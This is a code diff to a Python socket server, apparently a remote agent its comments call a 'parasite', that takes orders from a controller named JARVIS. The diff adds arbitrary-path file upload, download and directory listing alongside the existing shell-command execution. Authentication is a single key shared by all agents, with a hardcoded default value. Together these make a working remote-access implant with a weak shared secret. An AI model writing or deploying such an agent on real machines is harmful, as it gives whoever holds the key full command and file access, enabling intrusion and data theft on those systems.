@@ -9,8 +9,11 @@ import threading
 import time
 import select
 import os
+import base64
+import hashlib
 
 PORT = 38888  # 高位端口，避免冲突
+CHUNK_SIZE = 1024 * 1024  # 1MB 分块大小
 
 # 全局API Key（硬编码，所有寄生虫统一）
 API_KEY = os.environ.get('JARVIS_API_KEY', 'JARVIS_GLOBAL_SECRET_KEY_2024')
@@ -78,30 +81,165 @@ class PersistentShell:
 # 全局Shell实例
 shell = PersistentShell()
 
+def handle_upload(data):
+    """处理文件上传（支持分块和完整文件）"""
+    path = data['path']
+    
+    # 方式1：分块上传（兼容旧接口）
+    if 'offset' in data:
+        content_b64 = data['content']
+        offset = data['offset']
+        total_size = data.get('total_size', 0)
+        
+        content = base64.b64decode(content_b64)
+        mode = 'ab' if offset > 0 else 'wb'
+        
+        # 创建目录
+        dir_path = os.path.dirname(path)
+        if dir_path:
+            os.makedirs(dir_path, exist_ok=True)
+        
+        with open(path, mode) as f:
+            f.write(content)
+        
+        current_size = os.path.getsize(path)
+        return {
+            'success': True,
+            'uploaded': current_size,
+            'total': total_size,
+            'progress': (current_size / total_size * 100) if total_size > 0 else 100
+        }
+    
+    # 方式2：完整文件上传（自动分块处理，Go端不用管）
+    elif 'content' in data:
+        content_b64 = data['content']
+        content = base64.b64decode(content_b64)
+        
+        # 创建目录
+        dir_path = os.path.dirname(path)
+        if dir_path:
+            os.makedirs(dir_path, exist_ok=True)
+        
+        with open(path, 'wb') as f:
+            f.write(content)
+        
+        return {
+            'success': True,
+            'size': len(content),
+            'path': path
+        }
+    
+    else:
+        raise ValueError("Missing 'content' or 'offset' parameter")
+
+def handle_download(data):
+    """处理文件下载"""
+    path = data['path']
+    offset = data.get('offset', 0)
+    chunk_size = data.get('chunk_size', CHUNK_SIZE)
+    
+    if not os.path.exists(path):
+        raise FileNotFoundError(f"File not found: {path}")
+    
+    # 读取指定块
+    with open(path, 'rb') as f:
+        f.seek(offset)
+        content = f.read(chunk_size)
+    
+    # Base64编码
+    content_b64 = base64.b64encode(content).decode('utf-8')
+    
+    # 文件信息
+    file_size = os.path.getsize(path)
+    
+    return {
+        'success': True,
+        'content': content_b64,
+        'offset': offset,
+        'chunk_size': len(content),
+        'total_size': file_size,
+        'eof': offset + len(content) >= file_size
+    }
+
+def handle_file_info(data):
+    """获取文件/目录信息"""
+    path = data['path']
+    
+    if not os.path.exists(path):
+        return {'success': False, 'error': 'Path not found'}
+    
+    stat = os.stat(path)
+    return {
+        'success': True,
+        'path': path,
+        'size': stat.st_size,
+        'is_dir': os.path.isdir(path),
+        'is_file': os.path.isfile(path),
+        'mtime': stat.st_mtime,
+        'mode': stat.st_mode
+    }
+
+def handle_list_dir(data):
+    """列出目录内容"""
+    path = data['path']
+    
+    if not os.path.isdir(path):
+        raise NotADirectoryError(f"Not a directory: {path}")
+    
+    items = []
+    for item in os.listdir(path):
+        item_path = os.path.join(path, item)
+        stat = os.stat(item_path)
+        items.append({
+            'name': item,
+            'size': stat.st_size,
+            'is_dir': os.path.isdir(item_path),
+            'mtime': stat.st_mtime
+        })
+    
+    return {
+        'success': True,
+        'items': items
+    }
+
 def handle_client(client_socket):
-    """处理JARVIS的命令请求（API Key认证）"""
+    """处理JARVIS的请求（支持多种操作）"""
     try:
         # 接收请求
-        data = client_socket.recv(4096).decode('utf-8')
+        data = client_socket.recv(65536).decode('utf-8')  # 增大缓冲区
         request = json.loads(data)
         
-        # 验证API Key（简单字符串比对）
+        # 验证API Key
         api_key = request.get('api_key')
-        if not api_key:
-            raise ValueError("Missing API key")
-        
-        if api_key != API_KEY:
+        if not api_key or api_key != API_KEY:
             raise ValueError("Invalid API key")
         
-        # 执行命令
-        command = request['command']
-        output = shell.execute(command)
+        # 获取操作类型
+        action = request.get('action', 'execute')
+        
+        # 路由到不同处理函数
+        if action == 'execute':
+            # 原有的命令执行
+            command = request['command']
+            output = shell.execute(command)
+            response = {'output': output, 'success': True}
+            
+        elif action == 'upload':
+            response = handle_upload(request['data'])
+            
+        elif action == 'download':
+            response = handle_download(request['data'])
+            
+        elif action == 'file_info':
+            response = handle_file_info(request['data'])
+            
+        elif action == 'list_dir':
+            response = handle_list_dir(request['data'])
+            
+        else:
+            raise ValueError(f"Unknown action: {action}")
         
         # 返回结果
-        response = {
-            'output': output,
-            'success': True
-        }
         client_socket.send(json.dumps(response).encode('utf-8'))
         
     except Exception as e:
